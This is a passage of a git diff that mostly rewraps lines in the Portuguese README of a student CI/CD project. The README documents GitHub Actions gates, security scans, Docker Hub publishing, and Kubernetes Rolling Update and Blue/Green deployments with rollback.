@@ -1,8 +1,9 @@
 # CI/CD — Grupo WJD
 
-Pipeline de **Integração Contínua e Entrega Contínua (CI/CD)** em GitHub Actions,
-desenvolvido nas Atividades 1 e 2 da disciplina de **Pipelines de Entrega Contínua
-(CI/CD) e Automação de Deployments**, da especialização em DevOps da CESAR School.
+Pipeline de **Integração Contínua e Entrega Contínua (CI/CD)** em GitHub
+Actions, desenvolvido nas Atividades 1 e 2 da disciplina de **Pipelines de
+Entrega Contínua (CI/CD) e Automação de Deployments**, da especialização em
+DevOps da CESAR School.
 
 A aplicação é uma todo-list em Flask + SQLite que veio pronta no starter-kit. O
 objeto de estudo é o **pipeline**, não a aplicação.
@@ -12,7 +13,8 @@ objeto de estudo é o **pipeline**, não a aplicação.
 > e só depois explica as decisões.
 
 [![CI](https://github.com/weynne/cicd-grupo-WJD/actions/workflows/ci.yml/badge.svg)](https://github.com/weynne/cicd-grupo-WJD/actions/workflows/ci.yml)
-![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-2088FF?style=flat-square&logo=githubactions&logoColor=white)
+![GitHub
+Actions](https://img.shields.io/badge/GitHub_Actions-2088FF?style=flat-square&logo=githubactions&logoColor=white)
 ![Python](https://img.shields.io/badge/Python-3.10_|_3.11_|_3.12-3776AB?style=flat-square&logo=python&logoColor=white)
 ![Flask](https://img.shields.io/badge/Flask-000000?style=flat-square&logo=flask&logoColor=white)
 ![Trivy](https://img.shields.io/badge/Trivy-1904DA?style=flat-square&logo=aquasecurity&logoColor=white)
@@ -25,6 +27,8 @@ consertá-la passa a ter prioridade sobre qualquer funcionalidade nova.
 
 ## Sumário
 
+<!-- Uma entrada por linha: quebrar um link de sumário não ajuda ninguém. -->
+<!-- markdownlint-disable MD013 -->
 - [A entrega em um minuto](#a-entrega-em-um-minuto)
 - [Membros](#membros)
 - [O que o pipeline faz](#o-que-o-pipeline-faz)
@@ -91,29 +95,31 @@ consertá-la passa a ter prioridade sobre qualquer funcionalidade nova.
   - [2. `MEDIUM` incluído na faixa de severidade do Trivy](#2-medium-incluído-na-faixa-de-severidade-do-trivy)
   - [3. Actions no release atual, não nas versões dos esqueletos](#3-actions-no-release-atual-não-nas-versões-dos-esqueletos)
 - [Créditos](#créditos)
+<!-- markdownlint-enable MD013 -->
 
 ## A entrega em um minuto
 
-- **O que bloqueia o merge:** lint, testes em três versões do Python e dois scans
-  de segurança, todos obrigatórios no ruleset da `main`.
+- **O que bloqueia o merge:** lint, testes em três versões do Python e dois
+  scans de segurança, todos obrigatórios no ruleset da `main`.
 - **Como foi comprovado:** um PR com uma versão vulnerável do `requests` ficou
   vermelho, teve o merge bloqueado e voltou ao verde com a correção — ver
   [Evidências da entrega](#evidências-da-entrega).
-- **O que acompanha os gates:** alertas do Trivy anotados no próprio PR, cache de
-  dependências, publicação da imagem no Docker Hub, notificação no Discord e
+- **O que acompanha os gates:** alertas do Trivy anotados no próprio PR, cache
+  de dependências, publicação da imagem no Docker Hub, notificação no Discord e
   deploy em staging com aprovação humana.
-- **O que vai além do material do professor:** ver
-  [Além do material de referência](#além-do-material-de-referência).
+- **O que vai além do material do professor:** ver [Além do material de
+  referência](#além-do-material-de-referência).
 - **Onde divergimos do enunciado, e por quê:** ver
   [Divergências](#divergências-em-relação-ao-enunciado).
 - No CD, a imagem publicada é implantada em um cluster Kubernetes. O pipeline
-  suporta **Rolling Update** e **Blue/Green**, com deploy do ambiente separado da
-  troca de tráfego em produção.
+  suporta **Rolling Update** e **Blue/Green**, com deploy do ambiente separado
+  da troca de tráfego em produção.
 - No Blue/Green, o rollback é realizado pela troca do tráfego de volta para a
   versão anterior, mantendo os dois ambientes disponíveis durante a operação.
 - **Como o CD foi comprovado:** deploy das versões Blue e Green, validação dos
   dois ambientes, troca do tráfego de produção e rollback para a versão anterior
-  foram executados no cluster Kubernetes — ver [Evidências da entrega](#evidências-da-entrega).
+  foram executados no cluster Kubernetes — ver [Evidências da
+  entrega](#evidências-da-entrega).
 
 ---
 
@@ -135,12 +141,13 @@ quando todos passam, constrói a imagem da aplicação e a publica no Docker Hub
 
 ### CD — Entrega contínua
 
-O CD utiliza a imagem publicada pelo CI e executa o deployment no cluster Kubernetes. No
-Rolling Update, o novo Deployment é aplicado, o rollout é acompanhado até a conclusão e
-a aplicação é validada por smoke test. No Blue/Green, o deployment da nova versão e a
-troca do tráfego de produção são etapas separadas, permitindo validar o ambiente antes
-da ativação. Caso necessário, o tráfego pode ser direcionado novamente para a versão
-anterior sem reconstruir a imagem.
+O CD utiliza a imagem publicada pelo CI e executa o deployment no cluster
+Kubernetes. No Rolling Update, o novo Deployment é aplicado, o rollout é
+acompanhado até a conclusão e a aplicação é validada por smoke test. No
+Blue/Green, o deployment da nova versão e a troca do tráfego de produção são
+etapas separadas, permitindo validar o ambiente antes da ativação. Caso
+necessário, o tráfego pode ser direcionado novamente para a versão anterior sem
+reconstruir a imagem.
 
 #### `cd.yml` — Rolling Update
 
@@ -157,32 +164,33 @@ O fluxo é:
 6. Aguarda a conclusão do rollout com `kubectl rollout status`.
 7. Executa um smoke test para verificar a aplicação após o deploy.
 
-O pipeline não considera o deployment concluído apenas porque o manifesto foi aplicado.
-Após o `kubectl apply`, ele aguarda o rollout do Deployment com `kubectl rollout status`.
-Somente depois que o rollout é concluído o smoke test é executado pelo endpoint `/healthz`.
-Assim, uma falha na atualização ou na disponibilidade da aplicação interrompe o fluxo antes
-da validação final.
+O pipeline não considera o deployment concluído apenas porque o manifesto foi
+aplicado. Após o `kubectl apply`, ele aguarda o rollout do Deployment com
+`kubectl rollout status`. Somente depois que o rollout é concluído o smoke test
+é executado pelo endpoint `/healthz`. Assim, uma falha na atualização ou na
+disponibilidade da aplicação interrompe o fluxo antes da validação final.
 
 #### Blue/Green em dois workflows
 
 Além do Rolling Update, o projeto possui uma estratégia **Blue/Green**, dividida
 em dois workflows:
 
-- `cd-blue-green.yml`: realiza o deploy da nova imagem no ambiente Blue ou
-  Green escolhido, sem alterar o tráfego de produção.
+- `cd-blue-green.yml`: realiza o deploy da nova imagem no ambiente Blue ou Green
+  escolhido, sem alterar o tráfego de produção.
 - `cd-blue-green-switch.yml`: realiza a troca do tráfego de produção para o
   ambiente escolhido, após a validação do slot.
 
-A separação entre deploy e switch de tráfego permite validar a nova versão antes de
-colocá-la em produção. O ambiente que recebe a nova versão permanece fora do tráfego
-principal durante essa validação. Somente após a validação o Service de produção é
-alterado para apontar para a nova cor.
+A separação entre deploy e switch de tráfego permite validar a nova versão antes
+de colocá-la em produção. O ambiente que recebe a nova versão permanece fora do
+tráfego principal durante essa validação. Somente após a validação o Service de
+produção é alterado para apontar para a nova cor.
 
-A troca de tráfego também pode ser identificada visualmente na interface da aplicação. Cada
-slot utiliza um valor diferente de `APP_COLOR`, permitindo distinguir quando a produção está
-apontando para o ambiente `blue` ou para o `green`. Assim, durante a demonstração do CD, é
-possível confirmar a troca de tráfego tanto pelo endpoint de saúde quanto pela mudança visual
-da aplicação após o switch.
+A troca de tráfego também pode ser identificada visualmente na interface da
+aplicação. Cada slot utiliza um valor diferente de `APP_COLOR`, permitindo
+distinguir quando a produção está apontando para o ambiente `blue` ou para o
+`green`. Assim, durante a demonstração do CD, é possível confirmar a troca de
+tráfego tanto pelo endpoint de saúde quanto pela mudança visual da aplicação
+após o switch.
 
 ### O grafo de jobs
 
@@ -220,8 +228,8 @@ flowchart TD
 `Lint` e `test` rodam **em paralelo** — `needs:` é o que cria ordem no GitHub
 Actions, e só `push`, `deploy-staging` e `notify` declaram um. A imagem só é
 publicada depois que lint e testes passam. As setas pontilhadas são o caminho da
-falha: com `if: always()`, o `notify` roda mesmo quando o lint ou os
-testes reprovam, que é justamente quando o time precisa saber.
+falha: com `if: always()`, o `notify` roda mesmo quando o lint ou os testes
+reprovam, que é justamente quando o time precisa saber.
 
 ### O que acontece dentro de cada job da matrix
 
@@ -244,17 +252,18 @@ flowchart LR
 ```
 
 O Trivy vem **antes** do pytest de propósito: se a dependência já está
-comprometida, não faz sentido gastar minutos rodando a suíte. Quando ele reprova,
-o job já está vermelho e `pytest` e `pip-audit` ficam *skipped*. O upload do SARIF
-é a exceção: tem `if: always()` porque o step do Trivy sai com código 1 quando
-acha algo — sem isso, o relatório nunca chegaria ao code scanning exatamente
-quando há o que reportar.
+comprometida, não faz sentido gastar minutos rodando a suíte. Quando ele
+reprova, o job já está vermelho e `pytest` e `pip-audit` ficam *skipped*. O
+upload do SARIF é a exceção: tem `if: always()` porque o step do Trivy sai com
+código 1 quando acha algo — sem isso, o relatório nunca chegaria ao code
+scanning exatamente quando há o que reportar.
 
 ### Os gates
 
-Os gates abaixo são obrigatórios para o merge na `main`. O pull request só pode ser
-integrado quando todos os checks exigidos pelo ruleset estiverem concluídos com sucesso.
-Eles cobrem qualidade do código, testes automatizados e verificações de segurança.
+Os gates abaixo são obrigatórios para o merge na `main`. O pull request só pode
+ser integrado quando todos os checks exigidos pelo ruleset estiverem concluídos
+com sucesso. Eles cobrem qualidade do código, testes automatizados e
+verificações de segurança.
 
 | Gate | Ferramenta | O que pega | Bloqueia o merge? |
 | --- | --- | --- | --- |
@@ -267,20 +276,15 @@ Eles cobrem qualidade do código, testes automatizados e verificações de segur
 
 ## Da aplicação à imagem no Docker Hub
 
-Antes da implementação do CD, a imagem utilizada pelos manifestos
-Kubernetes ainda não existia no Docker Hub. Por isso, uma das primeiras
-etapas foi garantir que o pipeline de CI fosse capaz de construir e
-publicar a imagem da aplicação.
+Antes da implementação do CD, a imagem utilizada pelos manifestos Kubernetes
+ainda não existia no Docker Hub. Por isso, uma das primeiras etapas foi garantir
+que o pipeline de CI fosse capaz de construir e publicar a imagem da aplicação.
 
 O processo completo é:
 
-**Código da aplicação**
-→ **Dockerfile**
-→ **Build da imagem Docker**
-→ **Teste da imagem**
-→ **Tag da imagem**
-→ **Docker Hub**
-→ **Imagem disponível para o Kubernetes**
+**Código da aplicação** → **Dockerfile** → **Build da imagem Docker** → **Teste
+da imagem** → **Tag da imagem** → **Docker Hub** → **Imagem disponível para o
+Kubernetes**
 
 ### Dockerfile
 
@@ -294,8 +298,8 @@ O `Dockerfile` contém as instruções necessárias para criar a imagem da
 aplicação.
 
 A partir dele, o Docker reproduz o ambiente necessário para executar a
-aplicação, incluindo a imagem base, as dependências e os arquivos
-necessários para seu funcionamento.
+aplicação, incluindo a imagem base, as dependências e os arquivos necessários
+para seu funcionamento.
 
 ### Build da imagem
 
@@ -333,8 +337,8 @@ latest
 
 ### Teste da imagem
 
-Antes de publicar a imagem, é possível executar um container localmente
-para verificar se a aplicação inicia corretamente:
+Antes de publicar a imagem, é possível executar um container localmente para
+verificar se a aplicação inicia corretamente:
 
 ```bash
 docker run -d --name todolist -p 5000:5000 app-k8s-todolist:latest
@@ -364,11 +368,11 @@ docker rm todolist
 
 ### Tag da imagem para o Docker Hub
 
-Para publicar a imagem no Docker Hub, ela precisa ser identificada com o
-nome do repositório remoto.
+Para publicar a imagem no Docker Hub, ela precisa ser identificada com o nome do
+repositório remoto.
 
-O usuário do Docker Hub **não deve ser gravado diretamente no workflow ou
-no código do projeto**.
+O usuário do Docker Hub **não deve ser gravado diretamente no workflow ou no
+código do projeto**.
 
 Para uma publicação manual, utiliza-se um placeholder na documentação:
 
@@ -409,8 +413,8 @@ Login Succeeded
 
 ### Push da imagem para o Docker Hub
 
-Depois de realizar o login e associar a imagem ao repositório remoto,
-a publicação é feita com:
+Depois de realizar o login e associar a imagem ao repositório remoto, a
+publicação é feita com:
 
 ```bash
 docker push <USUARIO_DOCKERHUB>/app-k8s-todolist:latest
@@ -418,20 +422,20 @@ docker push <USUARIO_DOCKERHUB>/app-k8s-todolist:latest
 
 O Docker envia as camadas da imagem para o repositório informado.
 
-Depois do `push`, a imagem passa a estar disponível no Docker Hub com a
-tag utilizada.
+Depois do `push`, a imagem passa a estar disponível no Docker Hub com a tag
+utilizada.
 
 ### Validação da imagem publicada
 
-A disponibilidade da imagem pode ser validada a partir de outra máquina,
-como a EC2 que executará o cluster Kubernetes:
+A disponibilidade da imagem pode ser validada a partir de outra máquina, como a
+EC2 que executará o cluster Kubernetes:
 
 ```bash
 docker pull <USUARIO_DOCKERHUB>/app-k8s-todolist:latest
 ```
 
-Se o download for concluído com sucesso, a imagem está disponível para
-ser utilizada pelo Kubernetes.
+Se o download for concluído com sucesso, a imagem está disponível para ser
+utilizada pelo Kubernetes.
 
 Também é possível verificar a imagem localmente:
 
@@ -441,8 +445,8 @@ docker images
 
 ### Publicação da imagem pelo pipeline de CI
 
-Depois da validação do processo de construção e publicação, essa etapa
-passou a fazer parte do pipeline de CI.
+Depois da validação do processo de construção e publicação, essa etapa passou a
+fazer parte do pipeline de CI.
 
 O workflow responsável pelo CI é:
 
@@ -450,16 +454,12 @@ O workflow responsável pelo CI é:
 .github/workflows/ci.yml
 ```
 
-O pipeline executa os gates de qualidade e segurança antes da publicação
-da imagem.
+O pipeline executa os gates de qualidade e segurança antes da publicação da
+imagem.
 
 O fluxo executado pelo CI é:
 
-**Código**
-→ **Lint**
-→ **Testes**
-→ **Segurança**
-→ **Build da imagem Docker**
+**Código** → **Lint** → **Testes** → **Segurança** → **Build da imagem Docker**
 → **Push para o Docker Hub**
 
 Dessa forma, o CD não precisa construir a imagem novamente.
@@ -468,13 +468,13 @@ O CD utiliza uma imagem que já foi construída e publicada no Docker Hub,
 identificada pela tag informada na execução do workflow.
 
 A publicação da imagem ocorre somente após a conclusão bem-sucedida dos gates de
-qualidade e segurança. Dessa forma, o Docker Hub recebe apenas imagens produzidas
-por uma execução do CI que passou pelas verificações obrigatórias.
+qualidade e segurança. Dessa forma, o Docker Hub recebe apenas imagens
+produzidas por uma execução do CI que passou pelas verificações obrigatórias.
 
 ### Uso de Secrets no GitHub Actions
 
-Para evitar que informações de configuração fiquem gravadas diretamente
-no workflow, o usuário do Docker Hub é armazenado como um GitHub Secret.
+Para evitar que informações de configuração fiquem gravadas diretamente no
+workflow, o usuário do Docker Hub é armazenado como um GitHub Secret.
 
 O CI e o CD usam **o mesmo** secret, e é isso que garante que o deployment
 receba exatamente a imagem que o pipeline publicou:
@@ -497,16 +497,17 @@ A estrutura resultante é:
 
 Nesse processo:
 
-- `DOCKERHUB_USERNAME` fornece o usuário do Docker Hub, o mesmo que o CI usa para publicar;
+- `DOCKERHUB_USERNAME` fornece o usuário do Docker Hub, o mesmo que o CI usa
+  para publicar;
 - `IMAGE_NAME` define o nome da imagem;
 - `inputs.image_tag` define a versão da imagem utilizada no deployment.
 
 Assim, o usuário do Docker Hub não fica exposto diretamente no código do
 workflow.
 
-Os valores dos secrets não são armazenados no repositório nem aparecem nos arquivos
-de workflow. O GitHub Actions injeta esses valores em tempo de execução, mantendo
-credenciais e tokens fora do código versionado.
+Os valores dos secrets não são armazenados no repositório nem aparecem nos
+arquivos de workflow. O GitHub Actions injeta esses valores em tempo de
+execução, mantendo credenciais e tokens fora do código versionado.
 
 ### Referência da imagem no Kubernetes
 
@@ -516,25 +517,29 @@ O manifesto Kubernetes utiliza um placeholder para a imagem:
 image: SEU_USUARIO_DOCKERHUB/app-k8s-todolist:latest
 ```
 
-Durante a execução do CD, o workflow substitui o placeholder pela imagem
-formada com o usuário armazenado no GitHub Secret e pela tag informada no
+Durante a execução do CD, o workflow substitui o placeholder pela imagem formada
+com o usuário armazenado no GitHub Secret e pela tag informada no
 `workflow_dispatch`.
 
-Dessa forma, o manifesto pode permanecer versionado no repositório sem
-precisar armazenar diretamente o usuário utilizado pelo pipeline.
+Dessa forma, o manifesto pode permanecer versionado no repositório sem precisar
+armazenar diretamente o usuário utilizado pelo pipeline.
 
 ### Relação entre CI e CD
 
-O CI é responsável por validar a aplicação e, após a aprovação dos gates, construir e
-publicar a imagem Docker no Docker Hub. O CD utiliza essa imagem publicada como artefato
-de entrada para realizar o deployment no cluster Kubernetes.
+O CI é responsável por validar a aplicação e, após a aprovação dos gates,
+construir e publicar a imagem Docker no Docker Hub. O CD utiliza essa imagem
+publicada como artefato de entrada para realizar o deployment no cluster
+Kubernetes.
 
 Assim, o fluxo completo é:
 
-**Código → CI → gates → imagem Docker → CD → Kubernetes → validação → produção**
+```text
+Código → CI → gates → imagem Docker → CD → Kubernetes → validação → produção
+```
 
-No Rolling Update, o CD atualiza o Deployment existente. No Blue/Green, o CD publica a
-nova versão em um dos ambientes e a troca de tráfego ocorre em uma etapa separada.
+No Rolling Update, o CD atualiza o Deployment existente. No Blue/Green, o CD
+publica a nova versão em um dos ambientes e a troca de tráfego ocorre em uma
+etapa separada.
 
 > **Nota sobre o primeiro deployment:** durante a preparação inicial do
 > ambiente, foi necessário garantir que a imagem `app-k8s-todolist` já
@@ -547,14 +552,14 @@ nova versão em um dos ambientes e a troca de tráfego ocorre em uma etapa separ
 ## Entrega contínua no Kubernetes
 
 A partir daqui, a imagem publicada no Docker Hub vira aplicação rodando num
-cluster Kubernetes: primeiro o ambiente, depois o Ingress, depois os dois
-modos de deployment — Rolling Update e Blue/Green — e o rollback de cada um.
+cluster Kubernetes: primeiro o ambiente, depois o Ingress, depois os dois modos
+de deployment — Rolling Update e Blue/Green — e o rollback de cada um.
 
 ### Preparação do ambiente de deployment
 
-O deployment utiliza uma instância **EC2** como ambiente de execução do
-cluster Kubernetes. Nela foram configurados **Docker, kind e kubectl**,
-além do cluster Kubernetes utilizado pelo projeto.
+O deployment utiliza uma instância **EC2** como ambiente de execução do cluster
+Kubernetes. Nela foram configurados **Docker, kind e kubectl**, além do cluster
+Kubernetes utilizado pelo projeto.
 
 A validação do ambiente foi realizada com:
 
@@ -566,8 +571,8 @@ kind get clusters
 kubectl get nodes
 ```
 
-O cluster utilizado no laboratório é o `devops-labs`, e o nó deve estar
-com status `Ready`:
+O cluster utilizado no laboratório é o `devops-labs`, e o nó deve estar com
+status `Ready`:
 
 ```bash
 kubectl get nodes
@@ -579,12 +584,11 @@ A comunicação com o cluster foi validada com:
 kubectl cluster-info
 ```
 
-A partir desse ambiente, o GitHub Actions consegue acessar a EC2 por SSH
-e executar os comandos `kubectl` necessários para realizar os deployments.
+A partir desse ambiente, o GitHub Actions consegue acessar a EC2 por SSH e
+executar os comandos `kubectl` necessários para realizar os deployments.
 
-O acesso SSH utilizado pelo pipeline é baseado em uma chave privada
-armazenada como secret no GitHub, enquanto a chave pública é autorizada
-na EC2.
+O acesso SSH utilizado pelo pipeline é baseado em uma chave privada armazenada
+como secret no GitHub, enquanto a chave pública é autorizada na EC2.
 
 A estrutura utilizada no deployment é:
 
@@ -605,7 +609,8 @@ GitHub Actions
 
 ### Configuração do Ingress
 
-Para permitir o acesso à aplicação, foi utilizado o **NGINX Ingress Controller** no cluster Kubernetes.
+Para permitir o acesso à aplicação, foi utilizado o **NGINX Ingress Controller**
+no cluster Kubernetes.
 
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
@@ -623,7 +628,8 @@ O fluxo de acesso ficou:
 Cliente → NGINX Ingress Controller → Ingress → Service → Pod → Aplicação
 ```
 
-Para o acesso local, foi configurado o domínio `todolist.local` no arquivo `/etc/hosts`:
+Para o acesso local, foi configurado o domínio `todolist.local` no arquivo
+`/etc/hosts`:
 
 ```text
 <PUBLIC_IP> todolist.local
@@ -631,11 +637,12 @@ Para o acesso local, foi configurado o domínio `todolist.local` no arquivo `/et
 
 ### Deploy da aplicação no Kubernetes
 
-A aplicação foi publicada no cluster Kubernetes utilizando o manifesto `k8s/todolist.yaml`.
+A aplicação foi publicada no cluster Kubernetes utilizando o manifesto
+`k8s/todolist.yaml`.
 
-A imagem publicada pelo CI é pública. Ainda assim, o cluster guarda a credencial do Docker Hub
-num secret de autenticação no namespace `todolist`, que cobre o caso de o repositório da imagem
-passar a privado.
+A imagem publicada pelo CI é pública. Ainda assim, o cluster guarda a credencial
+do Docker Hub num secret de autenticação no namespace `todolist`, que cobre o
+caso de o repositório da imagem passar a privado.
 
 ```bash
 kubectl create secret docker-registry dockerhub-secret \
@@ -659,19 +666,20 @@ A imagem utilizada no projeto segue o padrão:
 <USUARIO_DOCKERHUB>/app-k8s-todolist:latest
 ```
 
-O manifesto declara o `imagePullSecrets` para que o Kubernetes use essa credencial caso a
-imagem deixe de ser pública.
+O manifesto declara o `imagePullSecrets` para que o Kubernetes use essa
+credencial caso a imagem deixe de ser pública.
 
-O `Service` da aplicação é do tipo `ClusterIP`. Ele fornece o endpoint interno para
-os Pods e é utilizado pelo Ingress para encaminhar as requisições recebidas pelo
-hostname configurado.
+O `Service` da aplicação é do tipo `ClusterIP`. Ele fornece o endpoint interno
+para os Pods e é utilizado pelo Ingress para encaminhar as requisições recebidas
+pelo hostname configurado.
 
-O `Deployment` também utiliza `readinessProbe` e `livenessProbe`, ambas baseadas no endpoint
-`/healthz`. A `readinessProbe` determina quando o Pod está pronto para receber tráfego,
-enquanto a `livenessProbe` permite que o Kubernetes reinicie o container caso a aplicação
-deixe de responder. No CD, o `kubectl rollout status` aguarda os Pods ficarem `Ready` antes
-de considerar o rollout concluído, e o smoke test em `/healthz` valida o caminho completo
-pelo Ingress até a aplicação.
+O `Deployment` também utiliza `readinessProbe` e `livenessProbe`, ambas baseadas
+no endpoint `/healthz`. A `readinessProbe` determina quando o Pod está pronto
+para receber tráfego, enquanto a `livenessProbe` permite que o Kubernetes
+reinicie o container caso a aplicação deixe de responder. No CD, o `kubectl
+rollout status` aguarda os Pods ficarem `Ready` antes de considerar o rollout
+concluído, e o smoke test em `/healthz` valida o caminho completo pelo Ingress
+até a aplicação.
 
 As credenciais reais do Docker Hub não são armazenadas no repositório.
 
@@ -685,9 +693,9 @@ O retorno HTTP `200 OK` confirmou o funcionamento da aplicação.
 
 ### Rolling Update
 
-O workflow `.github/workflows/cd.yml` realiza o deployment no namespace `todolist`
-usando a estratégia padrão `RollingUpdate` do Kubernetes, a partir de uma imagem já
-publicada no Docker Hub.
+O workflow `.github/workflows/cd.yml` realiza o deployment no namespace
+`todolist` usando a estratégia padrão `RollingUpdate` do Kubernetes, a partir de
+uma imagem já publicada no Docker Hub.
 
 O caminho percorrido é:
 
@@ -695,11 +703,12 @@ O caminho percorrido é:
 GitHub Actions → EC2 → kind/Kubernetes → Deployment → Service → Ingress → Aplicação
 ```
 
-O workflow recebe a tag da imagem pelo parâmetro `image_tag`; os sete passos que ele
-executa estão descritos em [`cd.yml` — Rolling Update](#cdyml--rolling-update).
+O workflow recebe a tag da imagem pelo parâmetro `image_tag`; os sete passos que
+ele executa estão descritos em [`cd.yml` — Rolling
+Update](#cdyml--rolling-update).
 
-Pela interface: **GitHub → Actions → Rolling deployment → Run workflow**, informando a
-tag desejada da imagem, por exemplo `latest`. Pela CLI:
+Pela interface: **GitHub → Actions → Rolling deployment → Run workflow**,
+informando a tag desejada da imagem, por exemplo `latest`. Pela CLI:
 
 ```bash
 gh workflow run cd.yml -f image_tag=latest
@@ -713,19 +722,21 @@ kubectl get pods -n todolist
 curl -i -H "Host: todolist.local" http://localhost/healthz
 ```
 
-A atualização é gradual: os Pods são substituídos aos poucos, sem que a aplicação
-fique completamente indisponível.
+A atualização é gradual: os Pods são substituídos aos poucos, sem que a
+aplicação fique completamente indisponível.
 
 ### Blue/Green
 
-Foi implementada uma estratégia de **Blue/Green Deployment**, mantendo dois ambientes independentes da aplicação no namespace `todolist-bg`:
+Foi implementada uma estratégia de **Blue/Green Deployment**, mantendo dois
+ambientes independentes da aplicação no namespace `todolist-bg`:
 
 ```text
 todolist-blue
 todolist-green
 ```
 
-Cada ambiente possui seu próprio Deployment e Service. O Service `todolist` é utilizado para direcionar o tráfego de produção para o ambiente ativo.
+Cada ambiente possui seu próprio Deployment e Service. O Service `todolist` é
+utilizado para direcionar o tráfego de produção para o ambiente ativo.
 
 Os acessos utilizados para validação são:
 
@@ -752,13 +763,16 @@ Para alterar o ambiente de produção:
 gh workflow run cd-blue-green-switch.yml -f color=green
 ```
 
-Após a troca, o ambiente selecionado passa a receber o tráfego de produção, enquanto o outro permanece disponível para rollback.
+Após a troca, o ambiente selecionado passa a receber o tráfego de produção,
+enquanto o outro permanece disponível para rollback.
 
-A estratégia permite validar a nova versão antes da troca do tráfego e realizar o retorno ao ambiente anterior caso necessário.
+A estratégia permite validar a nova versão antes da troca do tráfego e realizar
+o retorno ao ambiente anterior caso necessário.
 
 ### Rollback
 
-O rollback permite retornar a aplicação para uma versão anterior caso seja identificado algum problema após o deployment.
+O rollback permite retornar a aplicação para uma versão anterior caso seja
+identificado algum problema após o deployment.
 
 No ambiente de **Rolling Update**, o rollback pode ser realizado utilizando:
 
@@ -766,7 +780,8 @@ No ambiente de **Rolling Update**, o rollback pode ser realizado utilizando:
 kubectl rollout undo deployment/todolist -n todolist
 ```
 
-No ambiente **Blue/Green**, o rollback é realizado direcionando novamente o Service de produção para o ambiente anterior.
+No ambiente **Blue/Green**, o rollback é realizado direcionando novamente o
+Service de produção para o ambiente anterior.
 
 Exemplo, retornando para o ambiente `blue`:
 
@@ -780,7 +795,8 @@ Após o rollback, a aplicação pode ser validada pelo endpoint:
 curl -i -H "Host: todolist.local" http://localhost/healthz
 ```
 
-No Blue/Green, a versão anterior permanece disponível durante o processo, permitindo a retomada do tráfego sem necessidade de reconstruir a imagem.
+No Blue/Green, a versão anterior permanece disponível durante o processo,
+permitindo a retomada do tráfego sem necessidade de reconstruir a imagem.
 
 ## Início rápido
 
@@ -829,8 +845,8 @@ git push
 ```
 
 Os três checks voltam ao verde e os alertas passam a aparecer como *Fixed*; o
-merge passa a depender só da revisão de um code owner. O problema foi pego no PR, antes do merge,
-sem ninguém rodar a aplicação.
+merge passa a depender só da revisão de um code owner. O problema foi pego no
+PR, antes do merge, sem ninguém rodar a aplicação.
 
 > [!IMPORTANT]
 > Subir só para `2.32.x` **não** corrige os três CVEs. Os alertas do Trivy — e o
@@ -840,9 +856,9 @@ sem ninguém rodar a aplicação.
 ### 3. Aprovar o deploy em staging
 
 Logo após um merge na `main`, o job `Deploy to staging (dummy)` aparece como
-**Waiting**. Vá em **Actions → o run → Review deployments → Approve and deploy**.
-Quem aprova precisa ser um revisor do environment diferente de quem clicou em
-*Merge* — ver [Environment](#environment).
+**Waiting**. Vá em **Actions → o run → Review deployments → Approve and
+deploy**. Quem aprova precisa ser um revisor do environment diferente de quem
+clicou em *Merge* — ver [Environment](#environment).
 
 O job não faz deploy de verdade: o que se demonstra é o gate de aprovação
 humana, e cada aprovação fica registrada no histórico de deployments do
@@ -850,9 +866,10 @@ repositório.
 
 ### 4. Reproduzir o deploy e o rollback no Kubernetes
 
-O CD recebe como input a tag de uma imagem que já foi publicada pelo CI no Docker Hub.
-A imagem pode ser identificada pela tag curta do commit, permitindo implantar exatamente
-a versão produzida por uma execução específica do CI, sem reconstruir a imagem durante o CD.
+O CD recebe como input a tag de uma imagem que já foi publicada pelo CI no
+Docker Hub. A imagem pode ser identificada pela tag curta do commit, permitindo
+implantar exatamente a versão produzida por uma execução específica do CI, sem
+reconstruir a imagem durante o CD.
 
 No Rolling Update, informe a tag do commit publicada pelo CI:
 
@@ -872,14 +889,15 @@ No Blue/Green, o deploy também recebe a tag da imagem publicada:
 gh workflow run cd-blue-green.yml -f color=green -f image_tag=<SHA_CURTO_DO_COMMIT>
 ```
 
-A validação do slot ocorre antes da troca de tráfego. Depois, o switch direciona a produção
-para o ambiente escolhido:
+A validação do slot ocorre antes da troca de tráfego. Depois, o switch direciona
+a produção para o ambiente escolhido:
 
 ```bash
 gh workflow run cd-blue-green-switch.yml -f color=green
 ```
 
-Após a validação, o rollback pode ser demonstrado retornando o tráfego para `blue`:
+Após a validação, o rollback pode ser demonstrado retornando o tráfego para
+`blue`:
 
 ```bash
 gh workflow run cd-blue-green-switch.yml -f color=blue
@@ -922,8 +940,9 @@ daí que sai o formato deste pipeline: `lint` e `test` em paralelo, `push` com
 `notify` com `needs:` nos quatro.
 
 Cada job roda numa VM nova, isolada, destruída ao fim. Nada persiste entre jobs
-além do que for explicitamente armazenado em cache ou publicado como artefato — por isso o
-cache de pip existe, e por isso cada job precisa do seu próprio `checkout`.
+além do que for explicitamente armazenado em cache ou publicado como artefato —
+por isso o cache de pip existe, e por isso cada job precisa do seu próprio
+`checkout`.
 
 Usamos apenas **runners hospedados** pelo GitHub (`ubuntu-latest`). Runner
 self-hosted não é necessário aqui e traria manutenção e superfície de ataque sem
@@ -933,9 +952,9 @@ benefício.
 
 ## Pré-requisitos
 
-O pipeline de CI roda nos runners hospedados do GitHub e não exige ferramentas instaladas
-na máquina para sua execução. Para reproduzir localmente os gates ou executar/validar o
-deployment, são necessários os requisitos abaixo.
+O pipeline de CI roda nos runners hospedados do GitHub e não exige ferramentas
+instaladas na máquina para sua execução. Para reproduzir localmente os gates ou
+executar/validar o deployment, são necessários os requisitos abaixo.
 
 | Requisito | Para quê |
 | --- | --- |
@@ -951,10 +970,11 @@ Nenhuma credencial de nuvem é necessária.
 
 ## Configuração no GitHub
 
-O pipeline depende de configurações externas ao código para controlar permissões,
-proteção da `main`, credenciais e aprovações. No CD, essas configurações também
-permitem que o GitHub Actions acesse a EC2 e execute o deployment no cluster
-Kubernetes sem armazenar credenciais diretamente no repositório.
+O pipeline depende de configurações externas ao código para controlar
+permissões, proteção da `main`, credenciais e aprovações. No CD, essas
+configurações também permitem que o GitHub Actions acesse a EC2 e execute o
+deployment no cluster Kubernetes sem armazenar credenciais diretamente no
+repositório.
 
 ### Branch protection
 
@@ -988,9 +1008,9 @@ Kubernetes sem armazenar credenciais diretamente no repositório.
 
 O nome dos três checks da matrix tem **duas partes**, separadas por barra: o job
 do chamador com o valor da matrix (`test (3.10)`) e o job de dentro do reusable
